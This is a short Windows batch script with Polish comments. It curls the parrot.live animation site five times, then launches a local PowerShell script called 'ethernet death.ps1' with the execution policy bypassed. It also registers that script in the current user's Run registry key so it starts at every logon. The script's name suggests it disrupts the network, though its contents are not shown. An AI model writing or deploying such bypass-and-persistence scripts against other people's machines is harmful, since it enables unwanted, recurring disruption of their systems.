@echo off

:: Uruchamia curl parrot.live pięć razy
for /l %%x in (1, 1, 5) do (
curl parrot.live
)

:: Otwiera plik "D:\files\others\ethernet death.ps1"
start powershell.exe -ExecutionPolicy Bypass -File "D:\files\others\ethernet death.ps1"

:: Dodaje plik "D:\files\others\ethernet death.ps1" do auto-startu
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "ethernet death" /t REG_SZ /F /D "powershell -ExecutionPolicy Bypass -File "D:\files\others\ethernet death.ps1""